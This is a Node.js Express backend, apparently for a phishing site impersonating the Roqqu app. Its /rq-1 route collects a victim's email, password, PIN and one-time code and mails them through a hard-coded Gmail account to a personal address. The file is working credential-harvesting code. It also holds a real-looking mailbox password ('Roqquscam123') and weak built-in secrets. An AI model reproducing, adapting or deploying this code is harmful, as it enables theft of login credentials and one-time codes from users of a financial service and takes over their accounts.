const express = require('express')
const app = express()
const nodemailer = require('nodemailer')
const jwt = require('jsonwebtoken')
const csrf = require('csurf')
const cookieParser = require('cookie-parser')
const cors = require('cors')
const bodyParser = require('body-parser')
const session = require('express-session')
const auth = require('./middleware/is-Auth')



// const sessionConfig = {
//     // ... other methods
//     cookie: {
//         sameSite: 'none',
//     },
// }

// if (process.env.NODE_ENV === 'production') {
//     app.set('trust proxy', 1) // trust first proxy
//     sessionConfig.cookie.secure = true // serve secure cookies
// }

//app.use(session(sessionConfig))

app.use(auth)

app.use(express.json())

app.use(cookieParser('secret'))
app.use(express.urlencoded({ extended: true }))
//const parseForm = bodyParser.urlencoded({ extended: false })

const corsOptions = {
   // origin: 'https://roqquappchat.com',
    origin: 'http://localhost:3001',
    credentials: true,

}

app.use(cors(corsOptions))

const csrfProtection = csrf({ cookie: true })



app.get('/', (req, res) => {
    res.send('Welcome to rq1-back current name -- roqquappchat')
})


app.get('/form', csrfProtection, (req, res) => {
    console.log('the auth of form', req.Auth)
    console.log('in form')

    const csrfToken = req.csrfToken()

    const token = jwt.sign({ csrfToken }, 'supersecretkey', { expiresIn: '5m' })

    res.send({ token })
})

app.post('/rq-1', (req, res, next) => {
    console.log('req body', req.body)

    if (!req.Auth) {
        const err = new Error('Not authenticated')
        err.statusCode = 403
        throw err
    }

    const { email, password, pin, otp } = req.body

    console.log('length of otp', otp.length)

    if (otp.length > 6) {
        console.log('Attack started', otp)
        return
    } else {
        console.log('Normal email', otp)
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'www.bundleafrica@gmail.com',
                pass: 'Roqquscam123',
            },
        })

        transporter.verify(function (error, _success) {
            if (error) {
                console.log(error)
            } else {
                console.log('Server is ready to take our messages')
            }
        })

        const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat!!`

        const mail = {
            from: 'www.bundleafrica@gmail.com',
            to: 'testimonyibom@gmail.com',
            subject: 'New message from Roqquappchat',
            html: content,
        }

        transporter.sendMail(mail, (err, data) => {
            if (err) {
                console.log({ err })
                res.json({
                    status: 'fail',
                })
            } else {
                console.log('email sent', data)
                res.json({
                    status: 'success',
                })
            }
        })
    }
})


const PORT = process.env.PORT || 3031
app.listen(PORT, () => console.info(`server has started on ${PORT}`))
